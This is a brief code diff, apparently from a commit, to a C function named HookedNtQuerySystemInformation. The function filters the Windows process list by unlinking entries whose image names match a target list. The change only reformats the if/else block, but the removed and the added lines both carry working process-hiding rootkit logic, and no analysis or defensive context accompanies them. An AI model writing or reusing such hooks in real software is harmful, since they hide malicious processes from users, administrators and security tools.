@@ -26,14 +26,9 @@ NTSTATUS WINAPI HookedNtQuerySystemInformation(
             {
                 if (!wcsncmp(pNext->ImageName.Buffer, targetNames[i], pNext->ImageName.Length))
                 {
-                    if (0 == pNext->NextEntryOffset)
-                    {
-                        pCurrent->NextEntryOffset = 0;
-                    }
-                    else
-                    {
-                        pCurrent->NextEntryOffset += pNext->NextEntryOffset;
-                    }
+                    if (0 == pNext->NextEntryOffset) { pCurrent->NextEntryOffset = 0; }
+
+                    else { pCurrent->NextEntryOffset += pNext->NextEntryOffset; }
 
                     pNext = pCurrent;
                     break;
